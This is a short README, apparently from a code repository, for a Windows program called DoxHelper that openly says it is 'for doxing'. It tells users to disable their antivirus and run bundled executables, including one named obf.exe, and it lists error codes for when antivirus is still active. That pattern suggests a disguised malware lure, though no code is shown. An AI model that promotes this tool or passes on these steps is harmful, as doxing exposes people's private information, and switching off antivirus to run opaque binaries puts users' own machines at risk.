# DoxHelper
for doxing, help doxing.
Requirements for doxhelper:
Python version 3.11 PATH
Download Python here - https://www.python.org/downloads/
Turn off antivirus
Instructions:
First Download PYTHON 3.11 PATH
(https://www.python.org/downloads/)
Next, download the file from Github, unpack it to the desktop or on disk C, open the Doxhelper folder
in it we check the HELPERPYTHON folder for the presence of the files "obf.exe" and "helper.exe" we do not pay attention to the rest, then run dh.exe

Also:
Writing in TGuser/VKlink in Russian letters can stupidly break the program.


Error codes:
error 000 The antivirus was not turned off, or the program simply broke due to Russian letters in TGuser / VKlink
error 001 No python.
error 002 No Python PATH.

If you have 3 errors at once, then only the first example will be displayed:
You have an error error 000 error 001 error 002
You will see error 000, after fic 000 you will see error 001, etc.

!!! ABSOLUTELY!!!
Also, a program in the HELPERPYTHON file without an icon may be deleted due to the antivirus
when running dh.exe, check the HELPERPYTHON indicator without the presence icon helper.exe with the python icon
